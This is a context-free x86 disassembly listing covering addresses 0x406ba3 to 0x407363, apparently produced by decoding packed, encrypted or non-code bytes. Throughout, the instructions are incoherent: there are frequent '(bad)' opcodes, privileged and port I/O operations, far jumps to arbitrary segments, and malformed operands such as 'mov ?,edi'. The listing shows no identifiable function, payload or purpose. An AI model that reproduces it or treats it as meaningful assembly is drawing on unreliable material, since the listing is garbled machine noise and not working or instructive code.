  406ba3:	mov    al,0x95
  406ba5:	xor    al,0xf4
  406ba7:	add    eax,esp
  406ba9:	mov    ?,edi
  406bab:	fidivr DWORD PTR [bx+di-0x3764]
  406bb0:	adc    DWORD PTR [ebp+0x7b970f3c],0xd
  406bb7:	pop    esp
  406bb8:	inc    eax
  406bb9:	popf   
  406bba:	scas   eax,DWORD PTR es:[edi]
  406bbb:	daa    
  406bbc:	aas    
  406bbd:	pop    es
  406bbe:	stc    
  406bbf:	sti    
  406bc0:	sub    al,0xff
  406bc2:	push   ss
  406bc3:	in     al,dx
  406bc4:	add    DWORD PTR [ebp-0x29],0xffffffdf
  406bc8:	clc    
  406bc9:	inc    edi
  406bca:	adc    DWORD PTR [ebx],esp
  406bcc:	dec    ebx
  406bcd:	push   cs
  406bce:	mov    eax,ds:0x487b6e87
  406bd3:	into   
  406bd4:	xchg   esi,eax
  406bd5:	jmp    0xbec8a8bc
  406bda:	xlat   BYTE PTR ds:[ebx]
  406bdb:	or     al,0x4c
  406bdd:	aad    0x7b
  406bdf:	mov    edx,0xdf9aa219
  406be4:	mov    ch,0xff
  406be6:	test   DWORD PTR [ebx],ebp
  406be8:	jle    0x406c46
  406bea:	or     eax,DWORD PTR [edi]
  406bec:	pushf  
  406bed:	dec    esi
  406bee:	(bad)  
  406bef:	(bad)  
  406bf0:	into   
  406bf1:	pusha  
  406bf2:	or     bh,ah
  406bf4:	sub    BYTE PTR [edi+0x5d],0xc9
  406bf8:	cs sub ah,dh
  406bfb:	mov    dl,0x46
  406bfd:	inc    edi
  406bfe:	adc    BYTE PTR ds:0xe8a37ce8,cl
  406c04:	pop    ecx
  406c05:	push   eax
  406c06:	mov    dl,0x96
  406c08:	popa   
  406c09:	sar    cl,cl
  406c0b:	cs pop ss
  406c0d:	mov    ds:0x4546e33d,al
  406c12:	dec    edx
  406c13:	add    DWORD PTR [edi+0x4578f42c],0xffffffb5
  406c1a:	pusha  
  406c1b:	inc    esp
  406c1c:	rol    DWORD PTR [edi-0x5724ced3],1
  406c22:	test   eax,0xf847b43d
  406c27:	and    BYTE PTR [edi-0x7d],ch
  406c2a:	stc    
  406c2b:	sbb    ebx,DWORD PTR [eax+0x52]
  406c2e:	das    
  406c2f:	jmp    0x3b34dcba
  406c34:	dec    esi
  406c35:	push   es
  406c36:	ffree  st(2)
  406c38:	(bad)  
  406c39:	in     eax,dx
  406c3a:	adc    DWORD PTR [ecx+0x55],ecx
  406c3d:	imul   esi,DWORD PTR [eax+0x55],0xd0278649
  406c44:	or     BYTE PTR [esi-0x5112dbc7],ch
  406c4a:	sbb    BYTE PTR [ebx-0x185599bd],bl
  406c50:	add    bh,bh
  406c52:	inc    ebx
  406c53:	sbb    ah,ah
  406c55:	scas   al,BYTE PTR es:[edi]
  406c56:	daa    
  406c57:	mov    ecx,0x39a1bbfa
  406c5c:	test   BYTE PTR [edi+0x7c],dl
  406c5f:	sub    bl,dh
  406c61:	push   ebp
  406c62:	mov    esp,0xbe600982
  406c67:	jp     0x406bea
  406c69:	(bad)  
  406c6a:	in     eax,dx
  406c6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c6c:	xchg   ecx,eax
  406c6d:	add    al,0x54
  406c6f:	test   al,0x23
  406c71:	loop   0x406cc6
  406c73:	push   esi
  406c74:	xor    al,0x76
  406c76:	fmul   st,st(2)
  406c78:	aaa    
  406c79:	and    BYTE PTR ds:0x879db390,0x72
  406c80:	inc    ecx
  406c81:	stos   BYTE PTR es:[edi],al
  406c82:	jmp    0xd5e8ef8b
  406c87:	mul    BYTE PTR [eax+edi*1+0x1d]
  406c8b:	outs   dx,DWORD PTR ds:[esi]
  406c8c:	cli    
  406c8d:	(bad)  
  406c8e:	mov    esp,0x2abf4253
  406c93:	jne    0x406c8c
  406c95:	cmp    eax,0x51d62a4d
  406c9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c9b:	test   BYTE PTR [esi-0x43],0xee
  406c9f:	ja     0x406cd5
  406ca1:	adc    bh,ah
  406ca3:	sub    DWORD PTR [eax-0x3a10ce70],ecx
  406ca9:	mov    ds,ebp
  406cab:	push   0xffffffc2
  406cad:	mov    esp,0x7544b061
  406cb2:	sbb    edx,esp
  406cb4:	inc    ebp
  406cb5:	add    ebx,DWORD PTR [edi]
  406cb7:	add    esp,edi
  406cb9:	ror    BYTE PTR ds:0x3ab34b4d,1
  406cbf:	push   0x5d
  406cc1:	mov    ebp,0x398389be
  406cc6:	int    0xdd
  406cc8:	add    DWORD PTR [eax],edx
  406cca:	lods   al,BYTE PTR ds:[esi]
  406ccb:	jmp    0xefdc:0x9554c278
  406cd2:	sbb    ebx,edx
  406cd4:	into   
  406cd5:	pusha  
  406cd6:	mov    ds:0x65ce8c2c,al
  406cdb:	adc    BYTE PTR [ebx+ecx*1-0x61],al
  406cdf:	pop    es
  406ce0:	jecxz  0x406c9f
  406ce2:	and    DWORD PTR [edx],ecx
  406ce4:	outs   dx,DWORD PTR ds:[esi]
  406ce5:	mov    al,0x7a
  406ce7:	push   edx
  406ce8:	push   cs
  406ce9:	in     eax,0xab
  406ceb:	in     eax,dx
  406cec:	je     0x406c9d
  406cee:	or     DWORD PTR [eax+esi*8+0x1b1f059d],esi
  406cf5:	or     al,BYTE PTR ds:0xb6198ddd
  406cfb:	iret   
  406cfc:	(bad)  
  406cfd:	dec    edx
  406cfe:	cld    
  406cff:	inc    ebp
  406d00:	stos   DWORD PTR es:[edi],eax
  406d01:	inc    eax
  406d02:	dec    esi
  406d03:	sar    DWORD PTR ds:0xa31fbe3a,0xee
  406d0a:	dec    esp
  406d0b:	xchg   BYTE PTR [edx],ah
  406d0d:	in     al,0x85
  406d0f:	and    al,0xf6
  406d11:	pop    esi
  406d12:	push   ds
  406d13:	icebp  
  406d14:	sbb    eax,0xa926f7e
  406d19:	push   ds
  406d1a:	imul   esp,eax,0xffffff93
  406d1d:	cld    
  406d1e:	outs   dx,DWORD PTR ds:[esi]
  406d1f:	dec    eax
  406d20:	inc    esp
  406d21:	(bad)  
  406d23:	aaa    
  406d24:	xchg   ebx,eax
  406d25:	jne    0x406caa
  406d27:	dec    eax
  406d28:	outs   dx,DWORD PTR ds:[esi]
  406d29:	sub    DWORD PTR [eax+eiz*2+0xa9237a],edi
  406d30:	jmp    0x406d4d
  406d32:	dec    esp
  406d33:	xchg   edx,eax
  406d34:	das    
  406d35:	jns    0x406d04
  406d37:	rcr    BYTE PTR [esi+0x10abe4ba],1
  406d3d:	in     eax,0x20
  406d3f:	out    dx,al
  406d40:	outs   dx,DWORD PTR ds:[esi]
  406d41:	and    al,0xaf
  406d43:	push   esi
  406d44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d45:	sbb    DWORD PTR [edx-0x2d98608c],edx
  406d4b:	inc    ebx
  406d4c:	xchg   ecx,eax
  406d4d:	mov    esp,0x49f30c03
  406d52:	or     BYTE PTR [edx-0x31],0x86
  406d56:	(bad)  
  406d57:	jg     0x406d08
  406d59:	xchg   BYTE PTR [esi+0x2b3e6f01],dh
  406d5f:	and    al,0xec
  406d61:	pop    eax
  406d62:	test   dh,dl
  406d64:	cwde   
  406d65:	mov    dh,0x1c
  406d67:	inc    ebx
  406d68:	dec    edx
  406d69:	setp   dl
  406d6c:	add    DWORD PTR [edx-0x4c],ecx
  406d6f:	in     eax,0x5e
  406d71:	std    
  406d72:	jle    0x56f261d6
  406d78:	in     al,0x8e
  406d7a:	cmp    bh,BYTE PTR [ecx]
  406d7c:	mov    esp,0x5fd5eb89
  406d81:	pop    edx
  406d82:	mov    WORD PTR [edi+eiz*2-0x4b],ss
  406d86:	xchg   ebp,eax
  406d87:	test   DWORD PTR [eax-0x5d],0xa5a20e1b
  406d8e:	popf   
  406d8f:	dec    edx
  406d90:	add    al,0xa7
  406d92:	dec    ebx
  406d93:	cmp    BYTE PTR [edx+0x38],0x87
  406d97:	pusha  
  406d98:	ss pop ss
  406d9a:	in     al,dx
  406d9b:	icebp  
  406d9c:	jnp    0x406d79
  406d9e:	cmp    al,0x50
  406da0:	call   0x751b7412
  406da5:	daa    
  406da6:	mov    ah,0x3d
  406da8:	push   ebx
  406da9:	dec    esp
  406daa:	xchg   BYTE PTR [edx-0x565c444a],bl
  406db0:	sbb    ah,cl
  406db2:	jmp    0x406ded
  406db4:	imul   esp,edx,0xa
  406db7:	lods   eax,DWORD PTR ds:[esi]
  406db8:	arpl   sp,cx
  406dba:	imul   esp,DWORD PTR ds:[edi],0x7808a0bf
  406dc1:	test   al,0xf9
  406dc3:	js     0x406d6c
  406dc5:	mov    al,0x2f
  406dc7:	push   es
  406dc8:	push   ebp
  406dc9:	xor    DWORD PTR [edi],edx
  406dcb:	ins    DWORD PTR es:[edi],dx
  406dcc:	dec    eax
  406dcd:	mov    edi,0x3105588b
  406dd2:	vpsraw xmm3,xmm5,xmm1
  406dd6:	or     al,0xee
  406dd8:	sbb    esp,DWORD PTR [edi+0xf]
  406ddb:	inc    BYTE PTR ds:0x5288acac
  406de1:	stos   BYTE PTR es:[edi],al
  406de2:	daa    
  406de3:	xchg   ecx,eax
  406de4:	cmp    al,0x68
  406de6:	push   esi
  406de7:	pop    ss
  406de8:	push   ecx
  406de9:	jmp    0x27499d55
  406dee:	or     eax,0xf4e187f8
  406df3:	ins    BYTE PTR es:[edi],dx
  406df4:	cmp    bh,BYTE PTR [esi+0x77]
  406df7:	clc    
  406df8:	mov    DWORD PTR [edi],0x98262a38
  406dfe:	je     0x406e26
  406e00:	jns    0x406d8f
  406e02:	icebp  
  406e03:	dec    ebp
  406e04:	jne    0x406e73
  406e06:	popa   
  406e07:	push   cs
  406e08:	pop    ecx
  406e09:	test   DWORD PTR [ecx-0x78],ebx
  406e0c:	fwait
  406e0d:	dec    eax
  406e0e:	cmp    eax,0xdd834658
  406e13:	in     al,dx
  406e14:	(bad)  
  406e15:	sbb    esp,edi
  406e17:	pop    es
  406e18:	jmp    0x670e54e5
  406e1d:	jg     0x406e53
  406e1f:	test   eax,0x20fe3344
  406e24:	sub    DWORD PTR [eax+edx*8-0x5c],edx
  406e28:	cld    
  406e29:	test   BYTE PTR [esi-0x415cc8c0],dl
  406e2f:	cli    
  406e30:	push   edx
  406e31:	adc    edi,edx
  406e33:	aad    0xc6
  406e35:	mov    bl,dh
  406e37:	das    
  406e38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e39:	sbb    ecx,DWORD PTR [ebx+0x5f7dcc5]
  406e3f:	shl    BYTE PTR [ecx],1
  406e41:	mov    cl,0x47
  406e43:	mov    ds,WORD PTR [edi]
  406e45:	adc    eax,0x2412c117
  406e4a:	jno    0x406e91
  406e4c:	xor    esi,DWORD PTR [esi]
  406e4e:	ja     0x406e3e
  406e50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e51:	jecxz  0x406dd4
  406e53:	xlat   BYTE PTR ds:[ebx]
  406e54:	ja     0x406e31
  406e56:	test   al,0x96
  406e58:	loopne 0x406de1
  406e5a:	sahf   
  406e5b:	pop    ss
  406e5c:	pop    esp
  406e5d:	cmp    eax,0xed0ae57b
  406e62:	push   ecx
  406e63:	or     al,0x64
  406e65:	sbb    al,0x70
  406e67:	mov    ecx,0x2d19e1da
  406e6c:	(bad)  
  406e6d:	pop    ecx
  406e6e:	pop    ebp
  406e6f:	clc    
  406e70:	cmc    
  406e71:	add    DWORD PTR [ebx],0x19
  406e74:	sub    eax,0x664cd4e2
  406e79:	or     cl,BYTE PTR fs:[ebx]
  406e7c:	call   0x6161:0x12db3312
  406e83:	adc    al,0xda
  406e85:	fld    QWORD PTR [ecx-0x34]
  406e88:	fwait
  406e89:	outs   dx,DWORD PTR ds:[esi]
  406e8a:	jmp    0xd7709ec7
  406e8f:	mov    ebx,0x2f3de280
  406e94:	adc    ebx,DWORD PTR [ebx]
  406e96:	jp     0x406e76
  406e98:	retf   
  406e99:	push   edi
  406e9a:	sbb    DWORD PTR [ecx-0x31],eax
  406e9d:	push   0x5d
  406e9f:	add    bl,BYTE PTR [ebx+0x31]
  406ea2:	add    BYTE PTR [ecx+0x6559753f],0x68
  406ea9:	jl     0x406f11
  406eab:	cmp    eax,0x96e15c8c
  406eb0:	lds    esi,FWORD PTR [ebx-0x4536abf6]
  406eb6:	add    eax,DWORD PTR [eax-0x32]
  406eb9:	mov    ebx,DWORD PTR [ebx+edx*2]
  406ebc:	xchg   ecx,eax
  406ebd:	mov    ecx,0x1e3ee2be
  406ec2:	ss pop ss
  406ec4:	adc    DWORD PTR [edi+0x1f],esp
  406ec7:	jmp    0x516:0xd41f7ed
  406ece:	push   0xd888871d
  406ed3:	aam    0x6c
  406ed5:	cmp    al,0x88
  406ed7:	mov    eax,ds:0xba16098c
  406edc:	sbb    al,0xfb
  406ede:	js     0x406eed
  406ee0:	jnp    0x406e8d
  406ee2:	sub    esi,eax
  406ee4:	cmp    eax,0x5ef56e7a
  406ee9:	mov    bh,0x9a
  406eeb:	outs   dx,BYTE PTR ds:[esi]
  406eec:	or     BYTE PTR [ebx-0x48516be7],dh
  406ef2:	ror    BYTE PTR [edx],1
  406ef4:	cmp    edx,esi
  406ef6:	and    DWORD PTR [edi-0x72],0x10
  406efa:	popf   
  406efb:	sbb    ebx,DWORD PTR [ebp+0x21]
  406efe:	xor    al,BYTE PTR ds:0xaa9b4998
  406f04:	xchg   ecx,eax
  406f05:	mov    bl,0x37
  406f07:	leave  
  406f08:	xor    eax,0x4699b613
  406f0d:	addr16 or al,0x15
  406f10:	imul   ecx,DWORD PTR [edi+0x5a7b4b96],0xce8ea0eb
  406f1a:	enter  0x4b2c,0x31
  406f1e:	test   BYTE PTR [edx-0x7e],0x10
  406f22:	jecxz  0x406f5b
  406f24:	jo     0x406eb5
  406f26:	lock adc al,0xe
  406f29:	push   cs
  406f2a:	call   0x961c:0xef5d123d
  406f31:	pop    edi
  406f32:	out    0xab,eax
  406f34:	push   esp
  406f35:	repnz and al,0x60
  406f38:	mov    esp,0x5ecc7037
  406f3d:	mul    BYTE PTR [esi-0x27e9bf0e]
  406f43:	ss add al,0xb5
  406f46:	sbb    ecx,edi
  406f48:	bound  ecx,QWORD PTR [esi-0x5e4a86ba]
  406f4e:	xor    ah,BYTE PTR [esi-0x21]
  406f51:	xor    eax,DWORD PTR [edx-0x25c7911c]
  406f57:	stos   DWORD PTR es:[edi],eax
  406f58:	stc    
  406f59:	neg    DWORD PTR [eax+0x2cabdd1b]
  406f5f:	je     0x406f5c
  406f61:	inc    ebx
  406f62:	push   ecx
  406f63:	fs iret 
  406f65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f66:	retf   
  406f67:	outs   dx,BYTE PTR ds:[esi]
  406f68:	mov    esi,0x5e5f8af
  406f6d:	add    BYTE PTR [ebx+0x59937e4d],0x53
  406f74:	cld    
  406f75:	sbb    DWORD PTR [edx-0x4],ebx
  406f78:	sbb    ah,BYTE PTR [esi]
  406f7a:	lock scas al,BYTE PTR es:[edi]
  406f7c:	xchg   bl,dh
  406f7e:	icebp  
  406f7f:	sub    cl,BYTE PTR [edx-0x6b6d03b6]
  406f85:	add    dl,BYTE PTR [ecx+esi*4]
  406f88:	mov    bh,0x12
  406f8a:	xor    DWORD PTR [eiz*4-0x7ae3eb9b],esp
  406f91:	pop    ecx
  406f92:	sub    al,0x3a
  406f94:	call   0x2e58:0x9e843bed
  406f9b:	jecxz  0x406fae
  406f9d:	mov    dl,0x70
  406f9f:	aam    0x59
  406fa1:	jmp    0x58eeb33e
  406fa6:	std    
  406fa7:	mov    cl,BYTE PTR [ebx+0x12]
  406faa:	push   ebp
  406fab:	mul    BYTE PTR [edi-0x77]
  406fae:	xchg   BYTE PTR [ebp-0x73],ch
  406fb1:	inc    ebp
  406fb2:	push   esp
  406fb3:	and    esi,DWORD PTR [edx-0x5]
  406fb6:	cmp    eax,0x1a48d4c6
  406fbb:	or     BYTE PTR [ecx-0x6],cl
  406fbe:	mov    ebx,0x12ff2b7b
  406fc3:	outs   dx,DWORD PTR ds:[esi]
  406fc4:	clts   
  406fc6:	push   ds
  406fc7:	or     BYTE PTR [edi],ch
  406fc9:	xchg   edi,eax
  406fca:	jnp    0x406f75
  406fcc:	sbb    BYTE PTR [edx],al
  406fce:	pop    ebp
  406fcf:	jb     0x406f90
  406fd1:	jmp    0xbe97:0x751d5642
  406fd8:	dec    ebx
  406fd9:	cli    
  406fda:	fdivr  st(2),st
  406fdc:	aam    0x25
  406fde:	inc    esp
  406fdf:	push   ecx
  406fe0:	xor    DWORD PTR [esi],0xb9ad9675
  406fe6:	inc    edi
  406fe7:	data16 cmc 
  406fe9:	xchg   esi,eax
  406fea:	sbb    eax,0xa7bacfe3
  406fef:	pop    esi
  406ff0:	mul    BYTE PTR [ebp-0x3bb46a42]
  406ff6:	cmp    ah,BYTE PTR [eax+0x59a81339]
  406ffc:	lods   eax,DWORD PTR ds:[esi]
  406ffd:	mov    dl,0xe3
  406fff:	jne    0x407003
  407001:	int3   
  407002:	mov    edi,0x6be81def
  407007:	pop    es
  407008:	(bad)  
  407009:	ret    0xdedf
  40700c:	mov    esp,0x17711fcb
  407011:	mov    ds:0x7566382d,al
  407016:	in     eax,0x7f
  407018:	push   0x5bbb583c
  40701d:	mov    ecx,0x2be9e539
  407022:	inc    ebx
  407023:	ds dec ebx
  407025:	adc    al,0x6d
  407027:	rcr    DWORD PTR ds:0xa142d391,1
  40702d:	out    dx,al
  40702e:	xchg   edx,eax
  40702f:	push   ecx
  407030:	aas    
  407031:	(bad)  
  407032:	rol    DWORD PTR [ecx],1
  407034:	loop   0x406fb6
  407036:	std    
  407037:	inc    edx
  407038:	jmp    0x407061
  40703a:	and    DWORD PTR [esi+0x237ad3ba],edx
  407040:	out    0xb0,al
  407042:	cmp    ecx,ecx
  407044:	cmp    al,0x57
  407046:	xor    edi,DWORD PTR [edi+0x70]
  407049:	sahf   
  40704a:	sbb    DWORD PTR [edi],esi
  40704c:	fnstcw WORD PTR [esi+0x25]
  40704f:	mov    edi,0x6de8144f
  407054:	in     eax,0x51
  407056:	push   esi
  407057:	out    0x80,eax
  407059:	dec    esp
  40705a:	(bad)  
  40705b:	hlt    
  40705c:	or     ah,BYTE PTR [eax-0x19]
  40705f:	xor    al,0x79
  407061:	cld    
  407062:	mov    DWORD PTR ds:0xc050c1dc,esp
  407068:	jno    0x407063
  40706a:	jg     0x407013
  40706c:	sub    DWORD PTR [eax-0x26],edx
  40706f:	push   eax
  407070:	test   al,0x2c
  407072:	sbb    ecx,DWORD PTR [esi+0x5752baf4]
  407078:	std    
  407079:	mov    es,WORD PTR [eax]
  40707b:	std    
  40707c:	cmp    ebp,DWORD PTR [ebp-0x39c0e349]
  407082:	stos   BYTE PTR es:[edi],al
  407083:	pusha  
  407084:	out    0x7a,al
  407086:	push   0x3a4861b0
  40708b:	xchg   ebp,eax
  40708c:	sub    eax,DWORD PTR [edi]
  40708e:	or     BYTE PTR [ebx],ch
  407090:	mov    ds:0x918dceb0,al
  407095:	test   DWORD PTR [ebp+0x7e4c5e2c],eax
  40709b:	popf   
  40709c:	out    0xe0,eax
  40709e:	sbb    BYTE PTR [esi+0x30],ah
  4070a1:	shl    DWORD PTR [edx],1
  4070a3:	fadd   st,st(5)
  4070a5:	ds stos BYTE PTR es:[edi],al
  4070a7:	sbb    ah,ch
  4070a9:	jbe    0x40710f
  4070ab:	retf   
  4070ac:	jnp    0x40709e
  4070ae:	jno    0x407068
  4070b0:	daa    
  4070b1:	xlat   BYTE PTR ds:[ebx]
  4070b2:	or     DWORD PTR [esi],esp
  4070b4:	jmp    0x4070f4
  4070b6:	icebp  
  4070b7:	cmp    BYTE PTR [edi+0x64],cl
  4070ba:	in     al,dx
  4070bb:	adc    DWORD PTR [edi+eax*8+0x5b1ef6cb],ebp
  4070c2:	and    bl,BYTE PTR [ecx+eiz*2]
  4070c5:	jns    0x40705d
  4070c7:	int    0xed
  4070c9:	mov    ebp,0x8e80a940
  4070ce:	adc    ebx,DWORD PTR [edi-0x2f]
  4070d1:	xchg   ch,dl
  4070d3:	cwde   
  4070d4:	xlat   BYTE PTR ds:[ebx]
  4070d5:	jecxz  0x407140
  4070d7:	mov    al,0x30
  4070d9:	mov    dh,0x3
  4070db:	dec    esp
  4070dc:	and    BYTE PTR [edx+eax*8+0x200be560],0xa6
  4070e4:	(bad)  
  4070e5:	loopne 0x4070ef
  4070e7:	std    
  4070e8:	inc    ecx
  4070e9:	fld    TBYTE PTR [ebx-0x22bdd242]
  4070ef:	jbe    0x407122
  4070f1:	ja     0x407156
  4070f3:	inc    ecx
  4070f4:	sbb    BYTE PTR [esi-0x5f526190],al
  4070fa:	or     BYTE PTR [ebx],0xde
  4070fd:	mov    al,ds:0xdc48444
  407102:	adc    esi,DWORD PTR [eax+0x15]
  407105:	adc    ah,dh
  407107:	mov    ebx,0x41256762
  40710c:	push   ebp
  40710d:	sub    DWORD PTR [edi-0x6c250d76],ecx
  407113:	cdq    
  407114:	dec    BYTE PTR [eax+0x43]
  407117:	fdiv   st,st(7)
  407119:	add    DWORD PTR [ebx+0x55],esi
  40711c:	xor    DWORD PTR [eax-0x49],edx
  40711f:	xchg   BYTE PTR [ebp+0x24],ch
  407122:	idiv   bh
  407124:	or     al,0xd1
  407126:	push   edx
  407127:	fcom   QWORD PTR [ebp+0x40b942a5]
  40712d:	(bad)  
  40712e:	xchg   edx,eax
  40712f:	inc    ecx
  407130:	mov    DWORD PTR [ecx],edx
  407132:	adc    DWORD PTR [edi+0x5e],esp
  407135:	adc    ah,BYTE PTR [edi+0x505c64dd]
  40713b:	out    dx,al
  40713c:	jns    0x407191
  40713e:	ds (bad) 
  407140:	jne    0x407163
  407142:	enter  0xd0b1,0x2b
  407146:	scas   eax,DWORD PTR es:[edi]
  407147:	cmp    al,0x55
  407149:	dec    DWORD PTR [ebx+0x20b7c236]
  40714f:	test   BYTE PTR [edi+0x4],ch
  407152:	mov    esp,0x623222be
  407157:	icebp  
  407158:	cmp    BYTE PTR [edi-0x7e],0xcb
  40715c:	sahf   
  40715d:	jle    0x40710c
  40715f:	icebp  
  407160:	ins    DWORD PTR es:[edi],dx
  407161:	ins    DWORD PTR es:[edi],dx
  407162:	retf   0xd5a7
  407165:	(bad)  
  407166:	pop    ss
  407167:	dec    ebx
  407168:	cld    
  407169:	dec    ebp
  40716a:	push   esp
  40716b:	stos   DWORD PTR es:[edi],eax
  40716c:	mov    ebx,0xfec424d6
  407171:	jmp    0x45b95ffc
  407176:	int    0xd8
  407178:	(bad)  
  407179:	stc    
  40717a:	jge    0x407187
  40717c:	not    BYTE PTR [esi+ebx*2-0x7225e179]
  407183:	mov    edi,0xa39ed6e0
  407188:	test   DWORD PTR [eax],esi
  40718a:	pop    ss
  40718b:	xchg   esi,eax
  40718c:	mov    edx,0xec0b9161
  407191:	das    
  407192:	xchg   ebx,eax
  407193:	popf   
  407194:	dec    esi
  407195:	pop    edi
  407196:	out    0x74,al
  407198:	push   0x789ffbc9
  40719d:	sub    al,0xd8
  40719f:	pop    ebp
  4071a0:	in     al,dx
  4071a1:	rcr    BYTE PTR [edx+ebp*2-0x1a8d7dc0],1
  4071a8:	rcl    DWORD PTR [ecx-0x24],cl
  4071ab:	cmp    al,0x73
  4071ad:	loope  0x407192
  4071af:	stos   BYTE PTR es:[edi],al
  4071b0:	push   0x58829c50
  4071b5:	mov    ?,WORD PTR [esi-0x5e]
  4071b8:	sub    DWORD PTR [ebx-0x17],ebp
  4071bb:	retf   
  4071bc:	loope  0x4071a3
  4071be:	fnstsw WORD PTR [edx-0x35850c6c]
  4071c4:	push   ecx
  4071c5:	sbb    BYTE PTR fs:[esi-0x72d8662f],dl
  4071cc:	fisubr WORD PTR [esp+edi*8-0x5f]
  4071d0:	mov    eax,ds:0x5085b604
  4071d5:	xor    bh,BYTE PTR es:[edx-0x2879c6b9]
  4071dc:	cmp    BYTE PTR [ebx+edi*4],0xba
  4071e0:	xor    ebx,ecx
  4071e2:	cmp    al,0xc1
  4071e4:	leave  
  4071e5:	pop    ss
  4071e6:	lds    ecx,FWORD PTR [ebp-0x4d]
  4071e9:	push   esi
  4071ea:	mov    ch,0xca
  4071ec:	jno    0x407238
  4071ee:	clc    
  4071ef:	xchg   ecx,eax
  4071f0:	add    bl,bl
  4071f2:	lock scas al,BYTE PTR es:[edi]
  4071f4:	pushf  
  4071f5:	mov    ch,0xd9
  4071f7:	lods   al,BYTE PTR ds:[esi]
  4071f8:	dec    ebx
  4071f9:	xchg   ecx,eax
  4071fa:	mov    DWORD PTR [ebx+eax*4-0x188d0c56],eax
  407201:	hlt    
  407202:	retf   
  407203:	addr16 call 0xbc96ef1
  407209:	mov    dh,0xc9
  40720b:	shr    DWORD PTR [ecx],1
  40720d:	push   0x7d6cdf0b
  407212:	hlt    
  407213:	dec    eax
  407214:	pushf  
  407215:	adc    DWORD PTR [edi+0x5d1bdea6],edx
  40721b:	rol    dl,cl
  40721d:	pop    ecx
  40721e:	add    ah,BYTE PTR [esi-0x5]
  407221:	mov    bl,0x93
  407223:	inc    esi
  407224:	fidiv  WORD PTR [ecx+ebp*8+0x1e4efec4]
  40722b:	mov    eax,0x896a3928
  407230:	cmp    eax,0xb9b30f5
  407235:	add    eax,DWORD PTR [edx-0x58]
  407238:	shr    BYTE PTR [ebp+0x78],cl
  40723b:	test   al,0x7
  40723d:	rcl    DWORD PTR [ebx-0xf],cl
  407240:	xchg   esi,eax
  407241:	xchg   ecx,eax
  407242:	scas   eax,DWORD PTR es:[edi]
  407243:	js     0x407282
  407245:	xchg   BYTE PTR [ebx],bh
  407247:	xor    BYTE PTR [edi+0x4d8ca271],0xc0
  40724e:	sub    BYTE PTR [esi],dh
  407250:	xlat   BYTE PTR ds:[ebx]
  407251:	ds sbb eax,0x19efa3cf
  407257:	(bad)  
  407258:	xor    al,0x4b
  40725a:	jno    0x407256
  40725c:	pop    esi
  40725d:	and    al,0x93
  40725f:	icebp  
  407260:	inc    eax
  407261:	call   0x7bdb:0xe0d3eef5
  407268:	test   eax,0x44f30888
  40726d:	loop   0x40721e
  40726f:	fld    DWORD PTR [edx-0x35]
  407272:	popa   
  407273:	mov    al,ds:0x2cb95bc7
  407278:	fmul   DWORD PTR [edx]
  40727a:	dec    esi
  40727b:	cdq    
  40727c:	dec    edx
  40727d:	sahf   
  40727e:	xchg   BYTE PTR [esp+edi*8+0x339ae0b9],al
  407285:	das    
  407286:	fild   DWORD PTR [esi+ecx*4+0x7f]
  40728a:	gs (bad) 
  40728c:	jl     0x407262
  40728e:	xchg   ebx,eax
  40728f:	popa   
  407290:	xor    eax,0xb897eb71
  407295:	dec    ecx
  407296:	outs   dx,BYTE PTR ds:[esi]
  407297:	pop    ss
  407298:	xor    esp,eax
  40729a:	jecxz  0x407259
  40729c:	jg     0x407279
  40729e:	pop    eax
  40729f:	xchg   edx,eax
  4072a0:	xor    dh,BYTE PTR [ebx]
  4072a2:	and    al,0x32
  4072a4:	(bad)  
  4072a5:	mov    al,ds:0xe467bf46
  4072aa:	retf   0x7ba
  4072ad:	pusha  
  4072ae:	ret    
  4072af:	mov    ebp,0x5631659
  4072b4:	retf   0x2834
  4072b7:	pop    edi
  4072b8:	cmp    BYTE PTR [ecx+0x16],0x4b
  4072bc:	enter  0xf64f,0xa4
  4072c0:	xor    ebp,DWORD PTR [ebp+edi*8-0x77054303]
  4072c7:	out    dx,eax
  4072c8:	pop    ebp
  4072c9:	inc    esi
  4072ca:	fisttp QWORD PTR [esi+0x5b]
  4072cd:	add    ebp,esp
  4072cf:	adc    DWORD PTR [eax],esi
  4072d1:	fistp  WORD PTR [esi]
  4072d3:	loopne 0x4072d3
  4072d5:	gs dec esp
  4072d7:	and    DWORD PTR [edi+0x45dd629e],0x66
  4072de:	push   ds
  4072df:	lds    esp,FWORD PTR [ebx+0x1b]
  4072e2:	mov    eax,0xda820801
  4072e7:	ret    
  4072e8:	retf   0x998f
  4072eb:	cmp    al,0xce
  4072ed:	lods   al,BYTE PTR ds:[esi]
  4072ee:	adc    ah,BYTE PTR [ebx+0x1]
  4072f1:	dec    ecx
  4072f2:	mov    al,0x57
  4072f4:	mov    WORD PTR [eax-0x564efbfc],ss
  4072fa:	out    0xc5,eax
  4072fc:	pop    es
  4072fd:	push   esp
  4072fe:	mov    ebp,0x6ec2d6cd
  407303:	pop    ds
  407304:	xchg   esi,eax
  407305:	xor    ah,BYTE PTR [edi+0x2e0c5f09]
  40730b:	xchg   cl,cl
  40730d:	loopne 0x4072e5
  40730f:	mov    ebp,esp
  407311:	lahf   
  407312:	dec    esi
  407313:	imul   ebp,ecx,0x4db75309
  407319:	pusha  
  40731a:	jae    0x407375
  40731c:	jecxz  0x407374
  40731e:	sbb    eax,0x36b227ca
  407323:	mov    bh,0xc0
  407325:	ds push ebx
  407327:	mov    WORD PTR [eax-0x7c],es
  40732a:	daa    
  40732b:	std    
  40732c:	nop
  40732d:	(bad)  
  40732e:	in     eax,0xb6
  407330:	ret    0x116e
  407333:	jne    0x407358
  407335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407336:	xchg   esi,eax
  407337:	nop
  407338:	(bad)
  40733c:	xor    ah,bh
  40733e:	mov    ebx,0x606612f
  407343:	imul   ebx,edx,0x1a
  407346:	imul   edx,DWORD PTR [edi],0xffffffb6
  407349:	(bad)  
  40734b:	sub    DWORD PTR [edi+eiz*4+0x2e2c3c6c],ecx
  407352:	int3   
  407353:	ss repz pop ds
  407356:	sbb    eax,0x7df7d5d4
  40735b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40735c:	cmp    al,0x16
  40735e:	mov    esi,0x85c69f91
  407363:	mov    bl,0x88
